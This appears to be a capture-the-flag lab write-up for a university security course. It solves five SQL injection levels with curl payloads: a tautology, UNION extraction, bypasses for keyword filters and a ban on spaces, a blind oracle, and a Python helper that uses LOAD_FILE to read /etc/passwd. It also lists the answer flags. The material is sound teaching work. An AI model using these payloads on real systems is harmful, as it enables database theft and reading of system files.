# Aufgabe 20 – SQL Injection (Levels 1–5)

**Target:** `http://ctf.secp.lab.nm.ifi.lmu.de:12000`
**Stack:** Apache 2.4.25 (Debian) · PHP 7.0.33 · MySQL 5.7.18 (mysqli)
**Goal:** Extract the flag(s) of each level (1–2 flags per level) using SQL injection only, read‑only (no `INSERT`/`UPDATE`/`DELETE`/`DROP`).
**Submission:** one flag per line in `/home/secpgast/Abgaben/20/sql_flags.txt` on `gwsec`, deduplicated with `sort -u`.

## Result – all flags

| Level | Technique | Flag(s) |
|------|-----------|---------|
| 1 | Boolean tautology in raw string concat | `FLAG-8a94da5963c1634274dcaad6f4c09349` |
| 2 | UNION on concatenated username + echoed session | `FLAG-9c4e69e4cfd239d4e16ba0c189f8d643`, `FLAG-a1e8c4268f2f673b5df74c953c16969d` |
| 3 | UNION + keyword‑filter bypass (`union`/`select` stripped once) | `FLAG-dad50ccc5b4e578f4ac050cd9fc39175` |
| 4 | UNION + space‑ban bypass (`/**/`, `#`) | `FLAG-26184a4137f2d771dba7cf239fc064e5` |
| 5 | **SQLi → LFI**: `LOAD_FILE` keyword‑filter bypass, read `/etc/passwd` | `FLAG-is_this_sqli_or_lfi` |

Final file content (6 lines):

```text
FLAG-26184a4137f2d771dba7cf239fc064e5
FLAG-8a94da5963c1634274dcaad6f4c09349
FLAG-9c4e69e4cfd239d4e16ba0c189f8d643
FLAG-a1e8c4268f2f673b5df74c953c16969d
FLAG-dad50ccc5b4e578f4ac050cd9fc39175
FLAG-is_this_sqli_or_lfi
```

---

## General method

Every level exposes its PHP via `?source` (except Level 5). To read it cleanly I stripped HTML tags and decoded entities:

```bash
curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/levelN.php?source' \
| sed 's/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&amp;/\&/g; s/&#039;/'"'"'/g' \
| grep -vE '^\s*$'
```

I used `curl` for every request so each step is reproducible.

---

## Level 1 – Tautology (classic `' OR '1'='1`)

### The bug
The PHP builds the query by directly concatenating the POST parameter:

```php
$query = "SELECT * FROM secrets WHERE session_id='" . $_POST['session_id'] . "'";
```

No escaping, no prepared statement → the value can break out of the string literal.

### Exploit
```bash
curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level1.php' \
  --data-urlencode "session_id=' OR '1'='1"
```

`' OR '1'='1` makes the `WHERE` always true, so **every** stored secret is returned instead of just our own session’s row. The page lists all secrets, including the planted flag.

> The table also contains many other students’ stored values, so the response has multiple `FLAG-…` strings (noise). The intended Level‑1 flag is **`FLAG-8a94da5963c1634274dcaad6f4c09349`**.

---

## Level 2 – UNION + reflected session (two flags)

### The bug
Login form takes `username` + `password`. The password is bound safely (prepared), **but the username is concatenated** into the SQL. After a “successful” login the app echoes `"Welcome " . $_SESSION['username']` and then `$flag`.

### Exploit
```bash
curl -s -c /tmp/c2 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level2.php' \
  --data-urlencode "username=x' UNION SELECT flag FROM my_secret_table -- -" \
  --data-urlencode "password=x" \
  --data-urlencode "submit=Login"
```

* The `UNION SELECT flag FROM my_secret_table` injects one column whose value becomes the “username”.
* The page prints `Welcome <flag1>!` (the UNION‑smuggled value is reflected) **and** prints the real `$flag` of the level.

Two distinct flags:
- reflected via welcome line → `FLAG-9c4e69e4cfd239d4e16ba0c189f8d643`
- the level’s own `$flag` → `FLAG-a1e8c4268f2f673b5df74c953c16969d`

---

## Level 3 – “The Blacklist Saga, Part 1”

### The bug (from `?source`)
A search box, vulnerable inside a `LIKE`:

```php
$filter = array('union', 'select');
foreach ($filter as $banned) {
    $_GET['q'] = preg_replace('/' . $banned . '/i', '', $_GET['q']);
}
...
$query = "SELECT * FROM search_engine
          WHERE title LIKE '%$q%' OR description LIKE '%$q%' OR link LIKE '%$q%';";
```

The blacklist removes `union` and `select` **once, non‑recursively**.

### The bypass
Because the replace runs only once, nesting the keyword survives:
- `ununionion` → strip inner `union` → `union`
- `selselectect` → strip inner `select` → `select`

I closed the `LIKE` string with `%'` and commented the rest with `-- -`.

### Finding the columns
```bash
# column count (3 columns succeed)
for n in 2 3 4 5; do
  c=$(seq -s, 1 $n)
  curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level3.php' --get \
    --data-urlencode "q=zz%' ununionion selselectect $c-- -" \
  | grep -Eo 'Number of results[^<]*'
done
```

3 columns reflect. Then enumerate (information_schema **is** reachable here):

```bash
# tables in current DB
curl -s '.../level3.php' --get \
  --data-urlencode "q=zz%' ununionion selselectect concat(table_name,0x3a,column_name),2,3 FROM information_schema.columns WHERE table_schema=database()-- -"
# -> search_engine(title,description,link) and users(username,password)
```

### Extract the flag
```bash
curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level3.php' --get \
  --data-urlencode "q=zz%' ununionion selselectect concat(username,0x3a,password),2,3 FROM users-- -" \
| grep -Eo 'FLAG-[A-Za-z0-9]+'
```

→ `FLAG-dad50ccc5b4e578f4ac050cd9fc39175`

`0x3a` = `:` separator (avoids quoting a literal).

---

## Level 4 – “The Blacklist Saga, Part 2”

### The bug (from `?source`)
Same query as L3, but the filter changed: instead of stripping keywords it **bans the space character**:

```php
if (strpos($_GET['q'], " ") !== false) die("Hacker detected");
```

### The bypass
* Replace spaces with inline comments `/**/`.
* Terminate the query with `#` (URL‑encoded) instead of `-- -` (which needs a space).

```bash
# 3 columns again
curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level4.php' --get \
  --data-urlencode "q=zz%'/**/union/**/select/**/1,2,3#"

# extract flag from users
curl -s 'http://ctf.secp.lab.nm.ifi.lmu.de:12000/level4.php' --get \
  --data-urlencode "q=zz%'/**/union/**/select/**/concat(username,0x3a,password),2,3/**/from/**/users#" \
| grep -Eo 'FLAG-[A-Za-z0-9]+'
```

→ `FLAG-26184a4137f2d771dba7cf239fc064e5`

(Here `union`/`select` are **not** filtered, only spaces — so plain keywords work as long as every space is `/**/`.)

---

## Level 5 – the hard one: SQL Injection → Local File Inclusion

This level was the most involved. `?source` returns only static HTML (the PHP is hidden), so I had to reverse‑engineer the filter purely from behaviour.

### 5.1 Recon

The page has a *“Motivate me”* button. Its JS redirects to a **numeric** GET parameter:

```js
var id = Math.floor(Math.random() * 6);
document.location = origin + "/level5.php?id=" + id;
```

`?id=0..5` each render a different motivational quote inside an `<h1>`:

```bash
for i in 0 1 2 3 4 5; do
  echo -n "id=$i: "
  curl -s ".../level5.php?id=$i" | sed -n '14,16p' | sed 's/<[^>]*>//g' | tr -s ' \n' ' '
  echo
done
# 1 -> JUST DO IT, 2 -> DON'T LET YOUR DREAMS BE DREAMS, ... etc.
```

So `id` is a **numeric** injection point (no surrounding quotes — the challenge description even says single/double quotes are blacklisted).

### 5.2 Boolean‑blind baseline

```bash
curl -s ".../level5.php?id=1/**/and/**/1=1" | grep -q "JUST DO IT" && echo TRUE_OK
curl -s ".../level5.php?id=1/**/and/**/1=2" | grep -q "JUST DO IT" || echo FALSE_OK
```

`AND 1=1` keeps the quote visible, `AND 1=2` hides it → reliable true/false oracle. Confirms numeric injection and that `/**/` works for spaces.

### 5.3 Mapping the filter (the tricky part)

Probing token‑by‑token I found the filter **strips certain keywords once** (same idea as L3), case‑insensitively:

| Keyword | Behaviour | Bypass |
|--------|-----------|--------|
| `union` | stripped once | `ununionion` |
| `select`| stripped once | `selselectect` |
| `where` | stripped once | `whewherere` |
| **`from`** | **stripped once** | `frfromom` |
| `load_file` | stripped once | `loload_filead_file` |
| `'` `"` | blacklisted | use hex literals (`0x...`) |

The **single quote / double quote ban** is why all payloads use hex strings instead of quoted literals.

#### The false‑positive trap

This cost the most time. Because `from` is silently **removed**, a payload like:

```sql
... select 1 from zzznotexist
```

becomes:

```sql
... select 1 zzznotexist      -- "from" deleted, table name becomes an ALIAS
```

That query is **valid** → it returns OK even though `zzznotexist` doesn’t exist. So naive “does `FROM <table>` error?” table‑existence tests gave **false positives for every name**, which is what made early brute‑forcing useless.

**Fix:** use the bypass `frfromom`. After the inner `from` is stripped it collapses to a **real** `FROM`:

```text
frfromom  --strip "from"-->  from
```

Verification of the detector (must be OK / must be ERR):

```bash
det(){ for i in $(seq 8); do r=$(curl -s ".../level5.php?id=$1"); [ -z "$r" ] && continue;
       echo "$r" | grep -qi Fatal && { echo ERR; return; } || { echo OK; return; }; done; echo EMPTY; }

det "-1/**/ununionion/**/selselectect/**/1/**/frfromom/**/motivation"   # -> OK   (real table)
det "-1/**/ununionion/**/selselectect/**/1/**/frfromom/**/zzzznotexist"  # -> ERR  (truly gone)
```

> Important detail about the oracle: the server intermittently returns an **empty** body. A wrong query throws a PHP `Fatal error: … fetch_assoc() on boolean …` (the `UNION` made the query fail). So the detector loops a few times, ignores empty responses, and classifies on the presence of `Fatal`. A single request is unreliable; ~6–8 retries make it deterministic.

### 5.4 Why brute force was needed (and how)

With a **real** `FROM`, I could finally test things correctly:

* Column count of the base query: only **1 column** unions cleanly
  ```bash
  det "-1/**/ununionion/**/selselectect/**/1/**/frfromom/**/motivation"     # OK
  det "-1/**/ununionion/**/selselectect/**/1,2/**/frfromom/**/motivation"   # ERR
  ```
* `information_schema` is **privilege‑blocked** for this DB user:
  ```bash
  # who am i
  curl -s ".../level5.php?id=-1/**/ununionion/**/selselectect/**/current_user()"   # level5@%
  curl -s ".../level5.php?id=-1/**/ununionion/**/selselectect/**/version()"        # 5.7.18

  det "-1/**/ununionion/**/selselectect/**/1/**/frfromom/**/information_schema.tables"  # ERR (no privilege)
  ```
  The dot itself is fine (`level5.motivation` works); the user simply has **no read access** to `information_schema`, so I cannot list tables/columns the normal way.

Because metadata was unavailable, the only way to discover schema objects was a **dictionary brute force** of table/column names using the reliable `frfromom` detector. Example loop:

```bash
det(){ for i in $(seq 6); do
  r=$(curl -s ".../level5.php?id=-1/**/ununionion/**/selselectect/**/1/**/frfromom/**/$1");
  [ -z "$r" ] && continue;
  echo "$r" | grep -qi Fatal && return 1 || return 0;
done; return 2; }

# sanity first
det motivation && echo "exists"      # exists
det zzzq && echo "BAD"               # (nothing printed = correctly NOT found)

for t in flag flags secret users quotes motivation motivations ...; do
  det "$t" && echo "FOUND TABLE=$t"
done
```

This reliably found exactly one application table:

* **`motivation(id, text)`** — and dumping it:
  ```bash
  curl -s ".../level5.php?id=-1/**/ununionion/**/selselectect/**/group_concat(id,0x3a,text,0x7c)/**/frfromom/**/motivation"
  # 0:DO IT | 1:JUST DO IT | 2:DON'T LET YOUR DREAMS BE DREAMS | 3:NOTHING IS IMPOSSIBLE
  # 4:STOP GIVING UP | 5:MAKE YOUR DREAMS COME TRUE
  ```
  → **no flag in the database.** Column brute‑force on `motivation` only yielded `id` and `text`. So the flag is *not* a DB row at all.

### 5.5 The real intended path – read the hint

The landing page (`/`) describes Level 5:

> *“My teacher has this weird website. I doubt there's any useful information in the database. **Maybe we can leak the /etc/passwd file instead?**”*

That reframes the whole level: it is **SQLi used to perform an LFI / arbitrary file read** via MySQL’s `LOAD_FILE()`, not data exfiltration.

`load_file` is also keyword‑filtered (stripped once), so it needed the same nesting trick, plus a **hex path** because quotes are banned:

```text
loload_filead_file  --strip "load_file"-->  load_file
/etc/passwd          = 0x2f6574632f706173737764
```

Proof the bypass works (`select 0x..` alone just echoes the path; the nested function actually reads it):

```bash
curl -s ".../level5.php?id=-1/**/ununionion/**/selselectect/**/loload_filead_file(0x2f6574632f706173737764)"
# -> root:x:0:0:root:/root:/bin/bash  daemon:x:1:1: ...
```

### 5.6 Extract the flag

I read the full file with a small Python helper that pulls the `<h1>` content out of the response and retries past empty/error responses:

```python
# /tmp/rf.py
import urllib.request, sys, re
B = "http://ctf.secp.lab.nm.ifi.lmu.de:12000/level5.php?id="
def readfile(path):
    hx = path.encode().hex()
    payload = f"-1/**/ununionion/**/selselectect/**/loload_filead_file(0x{hx})"
    for _ in range(10):
        try: h = urllib.request.urlopen(B+payload, timeout=10).read().decode('latin1')
        except: continue
        if not h.strip(): continue
        if 'Fatal error' in h: return None
        m = re.search(r'<h1>(.*?)</h1>', h, re.S)
        return m.group(1) if m else ""
    return None
print(readfile(sys.argv[1]))
```

```bash
python3 /tmp/rf.py /etc/passwd
```

Output (tail):

```text
mysql:x:999:999::/home/mysql:/bin/sh
FLAG-is_this_sqli_or_lfi:x:1000:1000::/home/FLAG-is_this_sqli_or_lfi:/bin/bash
```

The flag is planted as a **user account name** in `/etc/passwd`:

→ **`FLAG-is_this_sqli_or_lfi`**

The flag name itself is the punch line: *“is this SQLi or LFI?”* — it is SQLi that achieves LFI.

> Note: `LOAD_FILE` only reads files readable by the mysqld process and located under `secure_file_priv`. `/etc/passwd` is world‑readable so it works; `/var/www/html/level5.php` returned NULL (not readable by `mysql`), which is why the source wasn’t exposed via `?source` either.

---

## Mistakes / lessons learned (Level 5)

1. **Silent keyword stripping creates false positives.** Testing `FROM <table>` with the *plain* `from` keyword always “succeeded” because `from` was deleted and the table name turned into an alias. Every table looked like it existed. The fix was to verify the bypass token (`frfromom`) actually produces a *real* `FROM` by checking that a **known‑bad** name (`zzzznotexist`) reliably errors.
2. **Flaky oracle.** Intermittent empty responses meant a single request could mislabel a payload. Always loop with retries and decide on the stable signal (`Fatal error` present vs. quote rendered).
3. **Read the challenge text.** A lot of time went into DB enumeration before the landing‑page hint made it obvious the goal was file reading via `LOAD_FILE`, not DB rows.
4. **Quotes banned ⇒ hex everything** (`0x...` for paths and separators like `0x3a` = `:`).

---

## Submission

```bash
ssh gwsec 'mkdir -p /home/secpgast/Abgaben/20 && cat > /home/secpgast/Abgaben/20/sql_flags.txt <<EOF
FLAG-8a94da5963c1634274dcaad6f4c09349
FLAG-9c4e69e4cfd239d4e16ba0c189f8d643
FLAG-a1e8c4268f2f673b5df74c953c16969d
FLAG-dad50ccc5b4e578f4ac050cd9fc39175
FLAG-26184a4137f2d771dba7cf239fc064e5
FLAG-is_this_sqli_or_lfi
EOF
sort -u /home/secpgast/Abgaben/20/sql_flags.txt -o /home/secpgast/Abgaben/20/sql_flags.txt
cat  /home/secpgast/Abgaben/20/sql_flags.txt
wc -l /home/secpgast/Abgaben/20/sql_flags.txt'
```

All operations were **read‑only** (`SELECT`/`LOAD_FILE` only) — no data was modified, deleted, or dropped.
